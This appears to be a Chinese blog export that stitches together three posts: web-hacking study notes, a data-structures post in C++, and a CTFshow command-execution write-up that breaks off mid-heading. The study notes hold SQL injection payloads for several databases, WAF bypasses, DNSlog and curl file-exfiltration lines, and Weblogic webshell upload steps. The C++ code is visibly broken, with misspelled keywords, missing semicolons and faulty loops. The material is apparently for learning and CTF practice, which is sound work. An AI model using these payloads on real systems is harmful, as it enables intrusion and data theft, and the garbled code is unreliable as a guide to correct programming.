数据库类型\n    - Access\n    - Mysql\n    - Mssql\n    - Oracle\n    - Postsql\n    - SQLite\n    - Mongodb\n    - 其他\n  - 回显/盲注\n    - 回显注入\n    - 无回显注入\n    - 延时盲注\n    - 布尔盲注\n  - 提交方法\n    - GET\n    - POST\n    - COOKIE\n    - REQUEST\n    - HTTP头\n  - 数据类型\n    - 数字型\n    - 字符型\n    - 搜索型\n  - 查询方式\n    - select\n    - insert\n    - delete\n    - update\n    - order by\n  - 注入拓展\n    - 加解密注入\n    - JSON注入\n    - LADP注入\n    - DNSlog注入\n    - 二次注入\n    - 堆叠查询\n  - WAF绕过\n    - 更改提交方法\n    - 大小写混合\n    - 解密编码类\n    - 注释符混用\n    - 等价函数替换\n    - 特殊符号混用\n    - 借助数据库特性\n    - HTTP参数污染\n    - 垃圾数据溢出\n  - 防御方案\n    - 代码加载过滤\n    - WAF产品部署\n\n{% endpullquote %}\n\n\n\n{% pullquote mindmap mindmap-md %}\n\n- SQL注入流程\n  - 信息收集\n    - 操作系统\n    - 数据库名\n    - 数据库用户\n    - 数据库版本\n    - 其他(网站路径等)\n  - 数据注入:同数据库\n    - 低版本：使用暴力查询或者结合读取查询(MySQL 5.0以下)\n    - 高版本：使用information_schema有据查询(MySQL 5.0以上)\n  - 高权限注入\n    - 常规查询\n    - 跨库查询\n    - 文件读写\n\n{% endpullquote %}\n\nMYSQL数据库\n\n- 网站A---->数据库A\n  - 表A\n    - 列A\n      - 列A数据\n    - 列B\n      - 列B数据\n  - 表B......\n- 网站B---->数据库B......\n\n###### MySQL数据库注入\n\nMySQL 5.0以上自带一个information_schema表记录了所有数据库名,表名,列名的数据库,相当于可以通过它获取指定数据库下面的表名和列名信息\n\ntips:数据库中的“.”符号表示下一级,如user.member就是user库下的menber表\n\ninformation_schema.tables\t记录所有表名信息\n\ninformation_schema.columns\t记录所有列名信息\n\ntable_name\t表名\n\ncolumn_name\t列名\n\n1. **测试是否存在SQL注入**\n\n```\nSELECT * FORM users WHERE id=1 and 1=1 LIMIT 0,1 \n回显正常\nSELECT * FORM users WHERE id=1 and 1=2 LIMIT 0,1\n回显错误\n```\n\n2. **猜测字段数**\n\n```\norder by\t\t\t\t\t\t测试字段数量\nunion select 1,2,3\t判断回显位置\n```\n\n3. **信息收集**\n\n```\n数据库版本:version()\n数据库名:database()\n数据库用户:user()\n操作系统:@@version_compile_os\n```\n\n4. **查询指定数据库下表名,列名,任意数据**\n\n查表名\n\n```\nunion select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()\n```\n\n查列名\n\n```\nunion select 1,2,group_concat(column_name) from information_schema.columns where table_name=\"刚刚查出的表名\" and table_schema=\"数据库名\"\n```\n\n查数据\n\n```\nunion select 1,2,group_concat(想查询的列) from 数据库名.表名\n```\n\n**文件读写操作**\n\n目的：getshell\n\n```\nselect load_file('文件位置')\t读取文件\nselect 'X' into outfile 文件位置\n```\n\nmysql 新版本下**secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()传到哪个指定目录的。**在这个参数之外的位置读取文件会返回NULL\n\n一个load_file小提示：https://blog.csdn.net/weixin_30292843/article/details/99381669\n\n**文件路径的常见获取方法**：\n\n报错显示：通过输入错误内容导致函数执行出错，报错显示出文件路径\n\n遗留文件：phpinfo等\n\n漏洞报错：各种框架的问题\n\n平台配置文件：如apache，nginx，IIS等中间件\n\n爆破等\n\n###### 防注入：\n\n**自带防御：PHP中的魔术引号开关和addslashes()函数**\n\n`magic_quotes_gpc`开关被打开时`（magic_quotes_gpc=ON）`或输入内容被`addslashes`函数处理后时输入数据中含有单引号，双引号，反斜杠与NULL字符，都会被自动加上反斜杠，阻止SQL注入\n\n解决方案：进行16进制编码，MySQL能自动将十六进制转化为字符串执行\n\n**内置函数认证**\n\n没救了\n\n**关键字验证**\n\n可尝试大小写绕过\n\n**WAF防护**\n\n找方法（见上方导图）尝试吧\n\n**SQLMAP** \n\n\n\n## DAY 14 web漏洞 SQL注入 注入类型 提交注入\n\n**提交参数类型：**\n\n数字，字符，搜索，JSON等\n\n**请求方法：**\n\nGET，POST，COOKIE，REQUEST，HTTP HEADER等\n\n**PHP内置变量**\n\n$_GET（GET传参内容）\n\n$_POST（POST传参内容）\n\n$_REUQEST（GET和POST传参内容）\n\n$_SERVER（与服务器有关内容）\n\n\n\n**SQL语句干扰符号，看情况进行闭合或注释**\n\n'，\"，%，)，}等\n\n\n\n**数字型：**无引号包裹\n\n**字符型：**有引号包裹，需要闭合\n\n\n\n## DAY15 web漏洞 SQL注入 Oracle，MongoDB等注入\n\n当注入到一个不熟悉的数据库时，可搜索对应数据库的函数来帮助我们\n\n数据库的用户权限是由连接SQL的配置文件决定的\n\n\n\n**不同数据库的结构**\n\n- **Access**（.mdb文件）\n  - 表名\n    - 列名\n      - 数据\n\n特点：不同数据库是分离的，没啥功能\n\n\n\n- **MySQL，MSSQL等**\n  - 数据库名\n    - 表名\n      - 列名\n        - 数据\n\n\n\n\n\n\n- MSSQL\n\n特点：执行系统命令、读取注册表、读文件、写文件、下载远程文件、导出数据到指定的数据库服务器（能干的事贼多）\n\n\n\n**不同数据库注入命令**\n\n- Access\n\n```\n猜测字段\norder by 3\n获取表名（字典猜）\nunion select 1,2,3 from xxxx\n如果xxxx表存在就会返回数据，没有则空\n获取列名（字典猜）\nunion select 1,xxx,3 from xxxx\n如果xxx列存在就会返回数据，没有则空\n```\n\n- MSSQL\n\n```\n判断数据库类型\nand exists (select count(*) from sysobjects) 返回正常为MSSQL\n判断数据库版本\n有回显：and 1=@@version--\n无回显：and substring((select @@version),22,4)='2008'--无回显，2008即为版本，报错说明不是\n注入点权限判断\nselect is_srvrolemember('sysadmin');  判断当前是否为sa\nselect is_srvrolemember('db_owner');  判断当前用户写文件、读文件的权限（db_owner）\nselect is_srvrolemember('public');  判断是否有public权限，可以爆破表\n```\n\n- PostgreSQL\n\n```\n猜测字段\norder by 3\n获取当前数据库\nunion select null,null,current_database()--\n用户名：user\n用户权限：current_schema()\n会话用户：session_user\n获取表名\nunion select null,string_agg(relname,','),null,null from pg_stat_user_tables\n获取列名\nunion select null,string_agg(column_name,','),null,null from information_schema.columns\n获取数据\nunion select null,string_agg(xxxxx,','),null,null from 表名\n```\n\n- Oracle\n\n```\n猜测字段\norder by 3\n判断字段类型\nunion select null,null,'null' from dual 如果回显正常则说明3位置是数字型，反之则为字符型\n确定回显位置\nunion select 1,2,'3' from dual 假设1,2为数字，3为字符\n获取表名\nunion select 1,(select table_name from user_tables where rownum=1) from dual\nunion select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual 以此类推爆出所有表名\n\n获取列名\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）') from dual\nunion select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写）' and culumn_name not in ('第一个字段')) from dual 以此类推爆出所有表名\n获取数据\nunion select 1,字段1||字段2||字段3...||字段n from 表名 where rownum=1 -- 在Oracle中group_concat只能联俩\n\n```\n\n- MangoDB：用NoSQLAttack打 \n\n```\n$ne关键字，意味不等于\nMangoDB进行操作时应当先将前面的对象闭合'});return ({\n获取当前数据库\ntitle:tojson(db),xxx:'1\ndb.getCollectionNames()函数获取到的是数组，需要用tojson函数转化为字符串 \n获取所有集合（表）\ntitle:tojson(db.getCollectionNames()),xxx:'1\n获取所有字段\ndb.Authority_confidential为当前使用的表\nfind函数用于查询，[0]为第一条数据\ntitle:tojson(db.Authority_confidential.find()[0])\n```\n\n**SQLMAP，NoSQLAttack，Pangolin**\n\n\n\n\n\n\n\n## DAY16 web漏洞 SQL注入 查询方式 报错盲注\n\n**数据库的查询方式**\n\n```\nselect 查询数据（最常见的）\n在网站中进行数据显示查询的操作\n例：select * from users where id=$id\n\ninsert 插入数据\n在网站中进行用户注册添加等操作\n例：insert into users(id,name,password) values(1,'Jlan','pass')\n\ndelete 删除数据\n后台管理中删除的操作\n例：delete from users where id=$id\n\nupdate 更新数据\n后台管理数据同步或缓存等操作\n例：update user set password='newpass' where id=1 and name='Jlan'\n\norder by 排序数据\n一般结合表名或列名进行数据排序操作\n例： select * from users order by $id\n\n可以通过以上查询方式与网站应用的关系\n通过注入点产生的地方或应用猜到对方的SQL查询方式\n\n```\n\n**盲注**\n\n**内容：**盲注就是在注入过程中，获取的数据不能回显至前端页面，此时我们需要利用一些方法进行判断或尝试，这个过程称为盲注\n\n**分类：**布尔盲注（逻辑判断），时间盲注（延时判断），报错盲注（报错回显）\n\n**常用函数：**\n\nlike 'xxx%'\t判断xxx或xxx...是否成立\n\nregexp '^xxx[a-z]'\t匹配xxx以及xxx...等\n\nif(条件,返回值真,返回值假)\n\nsleep(时间秒)\n\nmid(字符串,起始位置,截取长度)\n\nsubstr(字符串,起始位置,截取长度)\n\nleft(字符串,截取长度)\n\nlength(字符串)\n\nord=ascii\n\nascii(字符)=ascii值\n\n**报错盲注**\n\n常用函数：`floor,updatexml,extractvalue`\n\nextractvalue函数：\n\n语法：`extractvalue(目标xml文档,xml路径)`\n\n报错：当目标xml文档不存在时会返回xml路径\n\n1、通过floor报错,注入语句如下:\n`and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)`\n\n2、通过ExtractValue报错,注入语句如下:\n`and extractvalue(1, concat(0x7e,想查询的内容,0x7e))`\n\n3、通过UpdateXml报错,注入语句如下:\n`and 1=(updatexml(1,concat(0x7e,(select database())),1))`\n\n剩下的可参考这篇文章：https://www.jianshu.com/p/bc35f8dd4f7c\n\n**布尔盲注**\n\n返回页面只有正确与否两种形式，通过if语句以及返回值来得到结果\n\n\n\n\n\n\n\n**时间盲注**\n\n常用函数：`if,sleep`\n\nif函数：\n\n语法：if(条件,返回值真,返回值假)\n\nsleep函数：\n\n语法：sleep(时间（单位为秒）)\n\n用法：~~乖乖用sqlmap啊喂~~\n\n可以先用`length()`判断长度\n\n`and sleep(if(database()='a',5,0))`\n\n**Access偏移注入**\n\n**偏移注入主要是针对知道表，但是不知道字段的。**\n\n~~可以先试试看看源代码中表单的值或者URL特征等~~\n\n```\n首先猜测表：select exists(select * from sys_admin);\n然后爆出字段数：order by x\n然后爆出显示位：union select 1,2,3,4,5....,x from sys_admin\n爆出显示位的基础上依次递减，直到页面恢复正常为止：union select 1,2,3,4,5....,y,* from sys_admin\n最终字段数就等于c=x-2*(x-y)\n一级偏移语句： union select 1,2,3,4,5....c,* from (sys_admin as a inner join sys_admin as b on a.id = b.id)\n```\n\n## DAY17 web漏洞 SQL注入 二次注入 加解密 DNS等注入\n\n**加密解密**\n\n查看抓包内容中是否有加密后的字符串，尝试解密后进行注入时应先进行加密再进行\n\n**二次注入**\n\n在首次进行注册等写入数据库的操作时，将SQL语句写入数据库，在更新数据等操作被执行时，调用出前面构造好的SQL语句导致注入\n\n```\n例子：\n原始语句：\nupdate set password='$new_pass' where username='$user' and password='$current_pass'\n当Jlan正常执行该语句时\nupdate set password='123456' where username='Jlan' and password='000000'\n但是如果有个人尝试二次注入构造出以下用户名\nusername=Jlan'#\n此时这个人尝试更改密码，将会执行下列语句\nupdate set password='123456' where username='Jlan'#' and password='000000'\n#后面的语句全被忽略了，所以真正执行的是下面的语句\nupdate set password='123456' where username='Jlan'\n此时黑客虽然没有拿到Jlan的密码但却成功更改了Jlan的密码，完成二次注入\n```\n\n**DNSLog外带注入**（仅支持Windows）\n\n该方法使用条件\n\n- secure_file_priv **拥有读写权限**\n\n```sql\nsecure_file_priv = \"\"       # 可以读取磁盘目录\nsecure_file_priv = \"D:\\\"    # 可以读取D盘文件\nsecure_file_priv = null     # load_file限制，不能加载文件\n```\n\n- 在mysql 5.5.34 默认为空可以加载文件，之后的版本为NULL，不能加载文件\n\n```\nshow global variables like 'secure%';  //查看是否有写限制\n```\n\n在读写文件条件严苛时，可尝试load_file函数将数据带出\n\n```\nload_file(concat('\\\\\\\\',(想要带出的内容),'.你的URL\\\\kkk'))\n```\n\n此时load_file函数会尝试将访问URL，通过我们构造的URL即可将数据带出\n\n## DAY18 web漏洞 SQL注入 堆叠注入 WAF绕过\n\n**堆叠查询注入**\n\n将多条语句进行执行，使用分割符进行分割，可以直接进行一个数据的插入\n\n限制：只有部分数据库（MySQL）支持堆叠注入\n\n**WAF绕过**\n\n{% pullquote mindmap mindmap-md %}\n\n- WAF绕过\n  - 数据\n    - 大小写\n    - 加密解密\n    - 编码解码\n    - 等价函数\n    - 特殊符号\n    - 反序列化\n    - 注释符混用\n  - 方式\n    - 更改提交方式\n    - 变异\n  - 其他\n    - Fuzz大法\n    - 数据库特性\n    - 垃圾数据已出\n    - HTTP参数污染\n\n{% endpullquote %}\n\n**数据库特性**\n\nMySQL：\n\n```\n/*!50001 语句*/;\n意为只有5.00.01以上版本数据库才会执行\n```\n\n**绕过**\n\n1. ```\n   union#kkk%0Aselect 1,2,3#\n   %0A意为换行符，所以最终执行的语句如下\n   union \n   select 1,2,3#\n   ```\n\n2. IP白名单绕过\n\n   ```\n   构造HTTP请求头\n   \n   \n   ```\n\n3. 访问静态资源（旧版本WAF有效）\n\n   ```\n   /index.php/1.txt/?id=payload\n   ```\n\n4. URL白名单（旧版本WAF有效）\n\n   ```\n   WAF可能对管理页面等不进行拦截，可以尝试插入admin,manage,admin等来尝试匹配绕过\n   /?a=/admin/&id=payload\n   ```\n\n5. 构造爬虫\n\n   ```\n   尝试伪造搜索引擎等爬虫的UA，WAF可能放行\n   ```\n\n\n**HTTP参数污染**\n\n示例：\n\n```\n?id=1/**&id=-1 union select 1,2,3#*/\n当我们使用上面的语句传参时，WAF收到的id参数如下\n1/**&id=-1 union select 1,2,3#*/\n可见我们攻击内容包含在注释中，被WAF忽略，但实际上PHP接收到的参数如下\nid=-1 union select 1,2,3#*/\n成功执行了联合查询\n```\n\n\n\n- Apache+PHP 取后面参数\n- Tmocat+JSP 取前面参数\n- Apache+Perl 取前面参数\n- Apache+Python 取所有参数生成List\n- IIS+ASP 取所有参数\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY20  web漏洞 文件上传\n\n文件上传漏洞\n\n{% pullquote mindmap mindmap-md %}\n\n- 文件上传漏洞\n  - 验证/绕过\n    - 前端\n      - JS防护\n\n    - 后端\n      - 黑名单\n        - 特殊解析后缀\n        - .htaccess解析\n        - 大小写绕过\n        - 点绕过\n        - 空格绕过\n        - ::$$DATA绕过\n        - 配合解析漏洞\n        - 双后缀名绕过\n\n      - 白名单\n        - MIME绕过\n        - %00截断\n        - 0x00截断\n        - 0x0a截断\n\n      - 内容及其他\n        - 文件头检测\n        - 二次渲染\n        - 条件竞争\n        - 突破getimagesize\n        - 突破exif_imagetype\n\n- 漏洞/修复\n  - 解析漏洞\n    - IIS6/7.x\n    - Apache\n    - Nginx\n\n  - CMS漏洞\n  - 编辑器漏洞\n    - fckeditor\n    - ewebeditor\n    - ckeditor\n    - kindedit\n\n  - CVE等漏洞\n    - CVE-2015-5253\n    - CVE-2017-12615\n    - CVE-2019-2618\n\n- WAF绕过\n  - 安全狗\n  - 宝塔\n  - 云盾\n\n\n{% endpullquote %}\n\n{% pullquote mindmap mindmap-md %}\n\n- 利用思路\n  - 常规\n    - 扫描获取上传\n    - 会员中心上传\n    - 后台系统上传\n    - 各种途径上传\n  - CMS\n    - 已知CMS源码\n  - 编辑器\n    - ckeditor\n    - fckeditor\n    - kindeditor\n    - xxxxeditor\n  - 其他\n    - 代码审计\n    - 平台或第三方应用等\n\n{% endpullquote %}\n\n**nginx解析漏洞**\n\n```\n原理：Nginx拿到文件路径/test.jpg/1.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/1.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回“Access denied.”。\n\n这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项可帮助“修理”路径，举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。\n\n而在新版本的php中该漏洞可能不成功是因为新的php引入了“security.limit_extensions”，限制可执行文件的后缀，默认只执行.php文件\n```\n\n在上传后的文件中加/xxx.php可尝试解析漏洞\n\n**Weblogic任意文件上传漏洞（CVE-2018-2894）**\n\n[复现链接](https://blog.csdn.net/weixin_43625577/article/details/97001677)\n\n利用条件：Weblogic管理端未授权的两个页面存在任意上传jsp文件漏洞，**进而获取服务器权限**\n\n影响版本：weblogic 10.3.6.0、weblogic 12.1.3.0、weblogic 12.2.1.2、weblogic 12.2.1.3。\n\n```\n在base_domain中的‘高级’中勾选‘启动Web服务测试页’选项，保存配置\n访问/ws_utc/config.do\n设置Work Home Dir为\n/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css，访问这个目录是无需权限的，这一点很重要。\n然后点击‘安全’——>‘添加’，上传jsp木马\n审查查看时间戳\n访问/ws_utc/css/config/keystore/[时间戳]_[文件名]即可执行webshell\n```\n\n\n\n\n\n**文件上传骚操作**\n\n某些网站在文件上传后不会立刻提交数据包到后端，而是先在本地预览，等用户二次确认后才会将数据进行传输，并且大部分不使用普通的POST文件传输，而是经过加密的字符串，就离谱\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n## DAY25 web漏洞 XSS跨站\n\n产生原理\n\n上传了JS代码网页渲染导致的\n\n危害影响\n\n反射型：数据不会被存储到服务器\n\n存储型：数据被存储到数据库\n\nDOM型\n\n生效特点\n\n反射型\n\n提交x——>后端——>执行返回结果\n\n存储型\n\n提交x——>后端存储——>取出数据——>执行结果\n\nDOM型\n\n提交x——>本地浏览器静态前端代码执行——>被提交到后端执行\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"},{"title":"数据结构","url":"/posts/1106.html","content":"\n# 数据结构\n\n## 线性结构\n\n### 线性表顺序结构实现\n\n<!--more-->\n\n```C++\n//数组静态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType data[MaxSize];\n\tint length;\n}SqList;\n\n//数组动态分配\ntypedef struct{\n  char name[100];\n  int num;\n  float sum;\n}ElementType;\ntypedef struct{\n\tElementType *data;\n\tint length\n}SqList;\nSqList L;\nL.data=(ElementType*)malloc(sizeof(ElementType)*MaxSize);\n//#include <cstdlib>\n//malloc(m)函数，开辟m字节长度的地址空间，并返回这段空间的首地址\n//sizeof(x)运算，计算变量x的长度\n//free(p)函数，释放指针p所指变量的存储空间，彻底删除一个变量\n//typedef type name 定义种类为type的变量种类\n\n\n//各种功能实现\n//函数结果状态代码\n#define TRUE 1\n#define FALSE 0\n#define OK 1\n#define ERROR 1\n#define INFEASIBLE -1\n#define OVERFLOW -2\n//Status是所有函数的类型，值是函数结果状态代码\ntypedef int Status;\n\n//线性表初始化\nStatus InitList(SqList &L){\n  L.data=new ElementType[MAXSIZE];\n  if(!L.data)\n    exit(OVERFLOW);//内存开辟失败\n  L.length=0;\n  return OK;\n}\nvoid DestoryList(SqList &L){\n  if(L.data)\n    delete L.data;\n}\nvoid ClearList(SqList &L){\n  L.length=0;\n}\nint GetLength(SqList L){\n\treturn L.length;  \n}\nbool IsEmpty(SqList L){\n  if(L.length==0)\n    return true;\n  return false;\n}\nint GetElement(SqList L,int i,ElementType &e){\n\tif(i>=1&&i<=L.length){\n    e=L.data[i-1];\n    return OK;\n  }\n  return ERROR;\n}\nint FindElementByNum(SqList L,int num){\n  for(int i=0;i<L.length;i++){\n    if(L.data[i]==num){\n      return i+1;\n    }\n  }\n  return 0;\n}\nStatus Insert(SqList &L,int i,ElementType e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  if(L.length==MAXSIZE)\n    return ERROR;\n  for(int j=L.length-1;j>=i-1;j--){\n    L.data[j+1]=L.data[j];\n  }\n  L.data[i-1]=e;\n  L.length++;\n  return OK;\n}\nStatus Delete(SqList &L,int i,ElementType &e){\n  if(i<1||i>L.length+1)\n    return ERROR;\n  e=L.data[i-1]\n  for(int j=L.length-1;i<=j;i++){\n    L.data[i-1]=L.data[i];\n  }\n  L.length--;\n  return OK;\n}\n```\n\n### 线性表链式结构实现\n\n```C++\ntypedef struct{\n\tint num;\n  char name[10];\n  int score;\n}ElementType;\ntypedef struct Lnode{\n\tElementType data;\n\tstruct Lnode *next;\n}Lnode,*LinkList;\nLinkList L;<==>LNode *p\nStatus InitList(LinkList &L){\n  L=new LNode;\n  L->next=NULL;\n  return OK;\n}\nbool IsEmpty(LinkList L){\n  if(L->next==NULL)\n  \treturn 1;\n  return 0;\n}\nStatus DestoryList(LinkList &L){\n  LNode *p;\n  while(L!=NULL){\n    p=L;\n    L=L->next;\n    delete p;\n  }\n  return OK;\n}\nStatus ClearList(LinkList &L){\n  LNode *p,*q;\n  p=L->next;\n  while(L!=NULL){\n    q=p->next;\n    delete p;\n    p=q;\n  }\n  L->next=NULL;\n  return OK;\n}\nint ListLength(LinkList L){\n  int i=0;\n  LinkList p=L->next;\n  while(p!=NULL){\n    i++;\n    p=p->next;\n  }\n  return i;\n}\nint GetElement(LinkList L,int i,ElementType &e){\n\tif(i<1||i>L.length)\n    return ERROR;\n  LinkList p=L;\n  for(int j=1;j<=i;j++){\n    p=p->next;\n  }\n  e=p->data;\n  return OK;\n}\n*LNode FindElementGetAddress(LinkList L,ElementType e){\n  LinkList p=L->next;\n  while(p&&p->data!=e){\n    p=p->next;\n  }\n  return p;\n}\nint FindElementGetNum(LinkList L,ElementType e){\n  LinkList p=L->next;\n  int j=1;\n  whlie(p&&p->data!=e){\n    p=p->next;\n    j++;\n  }\n  if(p)\n    return j;\n  return 0\n}\nStatus Insert(LinkList &L,int i,ElementType e){\n  LinkList p=L;\n  LinkList s;\n  int j=1\n  s->data=e;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!p)\n    return ERROR;\n  LinkList s->next=p->next;\n  p->next=s;\n  return OK;\n}\nStatus Delete(LinkList &L,int i,ElementType &e){\n  LinkList p=L,s;\n  whlie(p&&j<=i-1){\n    j++;\n    p=p->next;\n  }\n  if(!(p->next)||j>i-1)\n    return ERROE\n  s=p->next;\n  p->next=s->next;\n  e=s->data\n  delete s;\n  return OK\n}\n//单链表建立方法：头插法\n//1、建立一个空表，重复读入数据\n//2、生成新节点，将读入数据存放到新节点的数据域中\n//3、从最后一个节点开始，依次将各节点插入到链表的前端\nL=new LNode;\np=new LNode;\np->data=a;\np->next=L->next;\nL->next=p;\n  \n//单链表建立方法：头插法\n    \nvoid CreateList_R(LinkList &L,int n){\n\tL=new LNode;\n  L->next=NULL;\n  r=L;\n  for(int i=0;i<n;i++){\n    p=new LNode;\n    cin>>p->data;\n    p->next=NULL;\n    r->next=p;\n    r=p;\n  }\n}\np->data=a;\np->next=NULL;\nr->next=p;//尾指针\nr=p\n    \n//循环链表\n//好处：从表中任意阶段出发均可找到表中其他节点\nLinkList Connect(LinkList &a,LinkList &b){\n  LinkList p=a->next;\n  a->next=b->next->next\n  delete b->next;\n  b->next=p;\n  return b;\n}\n//双向链表\ntypedef struct DuLNode{\n  ElementType data;\n  struct DuLNode *prior,*next;\n}DuLNode,*DuLinkList;\n    \n//线性表合并\nvoid Union(List &La,List Lb){\n  La_len=ListLength(La);\n  Lb_len=ListLength(Lb);\n  for(int i=1;i<=Lb_len;i++){\n    LNode e;\n    GetElement(Lb,i,e);\n    if(!FindElement(La,e))\n    \tInsert(&La,++La_len,e);\n  }\n}\n//有序表合并\nvoid Union(LinkList &La,LinkList &Lb,LinkList &Lc){\n  pa=La->next;\n  pb=Lb->next;\n  pc=Lc=La;\n  while(pa&&pb){\n    if(pa->data<=pb->data){\n      pc->next=pa;\n      pc=pa;\n      pa=pa->next;\n    }\n    else{\n      pc->next=pb;\n      pc=pb;\n      pb=pb->next;\n    }\n    pc->next=pa?pa:pb;\n    delete Lb;\n  }\n}\n    \n    \n    \n  \n    \n    \n    \n    \n    \n    \n    \n    \n  \n  \n  \n  \n  \n  \n\n\n\n```\n\n### 栈和队列\n\n```C++\n//栈只能在表尾进行插入和删除\n//队列只能在表尾插入，表头删除\n```\n\n","tags":["C++"]},{"title":"CTFshow命令执行","url":"/posts/47520.html","content":"\n# 命令执行\n\n危险函数：\n\n```\n------------------------------------------------执行(系统)函数\n\t eval\n\t exec - 执行一个外部程序\n\t shell_exec\n\t system\n\t passthru\n\t proc_open\n\t pcntl_exec — 在当前进程空间执行指定程序\n\t pcntl_fork  在当前进程当前位置产生分支（子进程）。\n\t dl — 运行时载入一个 PHP 扩展\n\t unserialize - 反序列化一个类函数nashell\n\t ------------------------------------------------显示源码   \n\t phpinfo\n\t readfile\n\t readline\n\t show_source\n\t heighlight\n\t heighlight_string\n\t curl\n\t php\n   curl -f filename=@/flag [要传到的ip地址和端口]\t\n\t 解释：在linux里面单引号里面的的命令会直接先执行\n\t 以上的curl -f命令会把@后面文件名对应的文件传输到指定的ip端口地址\n\t 所以会直接执行curl命令将得到的flag文件传输到指定id端口，不需要管ping\t  命令了只要监听此端口拿到文件即可\n\t file \n\t ------------------------------------------------回调函数\n\t array_walk\n\t array_walk_recursive\n\t array_map\n\t call_user_func_array\n\t call_user_func\n\t ------------------------------------------------数组使用回调函数过滤\n\t array_filter\n\t filter_var\n\t filter_var_array\n\t ------------------------------------------------写入文件\n\t fopen\n\t fwrite\n\t file_put_contents - 将数据写入文件中\n\t file-get-contents - 获取参数的文件资源\n\t move_uploaded_file - 将上传的文件移动到新位置\n\t ------------------------------------------------命令字符串转义\n\t escapeshellcmd - 对特殊字符转义\n\t escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数\n\t ------------------------------------------------其他\n\t proc_terminate — 杀除由 proc_open 打开的进程\n\t touch - 设定文件的访问和修改时间\n```\n\n可用于执行php函数的函数：\n\n```\neval()、assert()、preg_replace(\"/test/e\",$_POST[\"cmd\"],\"jutst test\")\n//正则规则中含有/e修饰符就存在代码执行漏洞\ncreate_function()\n```\n\n可用于执行系统命令的函数：\n\n```php\nexec()//返回命令执行结果，加echo\npassthru()//执行后直接显示结果\nsystem()//执行后直接显示结果,返回值：成功则返回命令输出的最后一行， 失败则返回 false\nshell_exec()//返回命令执行结果，加echo\n`命令`//返回命令执行结果，加echo\npopen()\nproc_open()\npcntl_exec()\n```\n\n<!--more-->\n\n可用于替代空格的字符：\n\n```\n%09、$IFS$9、 ${IFS}、$IFS%09、< 、<>、%20等\n```\n\n可用于读取文件的命令：\n\n```\ncat\ntac\nhead\nmore\nless\ncut\nnl\nls / | tee 1.txt\n将ls后的结果写入1.txt中\n```\n\n通配符：\n\n```\n*代表任意位\n?代表一位\n```\n\n**取反绕过**\n\n原理：php字符串取反之后可绕过正则\n\n```php\n<?php\n\t$s='phpinfo';\n\techo urlencode(~$s);\n\t//%8F%97%8F%96%91%99%90\n?>\n```\n\n这时传入`a=(~%8F%97%8F%96%91%99%90)();`\n\n即可执行phpinfo函数\n\n对于PHP，形如 `(func_name)()`，其中func_name可以是字符串，会执行这个func\n\n但是如果只传入`(~%8F%97%8F%96%91%99%90%D7%D6)`内容为`phpinfo()`，会发现此时函数不会被执行，此时php取反取得了phpinfo，但是取反得到的字符串 `phpinfo()`并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 `phpinfo()`\n\n所以如果我们想执行shell，是不能单传入一个`$_POST['kkk']`的取反来执行的，而是需要使用嵌套执行的方式，形如`assert($_POST[kkk])`传入`(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%94%94%94%A2)`再传入命令kkk来执行\n\n\n\n\n\n\n\n\n\n\n\n##### 29\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag，使用通配符绕过，f*代表匹配所有以f开头的文件，\\`内部为执行的命令，通过echo得到返回值\\`\n\n##### 30\n\n```\npayload:?c=echo(`cat%20f*`);\n```\n\n题目过滤了flag,system,php，同上\n\n##### 31\n\n```\npayload:?c=echo(`tac%09f*`);\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格，使用%09将空格替代即可\n\n##### 32\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号，可以使用文件包含函数`include()`，include可以实现无括号包含，进而通过`?>`将整个PHP代码闭合即可绕过分号，而后就能做到参数逃逸（因为代码中只检测了c中传入的内容），进而通过传入参数通过php伪协议读取内容\n\n##### 33\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号，同上\n\n##### 34\n\n```\npayload:?c=include%09$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n题目过滤了flag,system,php,cat,sort,shell,小数点,空格,单引号,波浪号,echo,分号,括号,双引号,冒号，同上\n\n##### 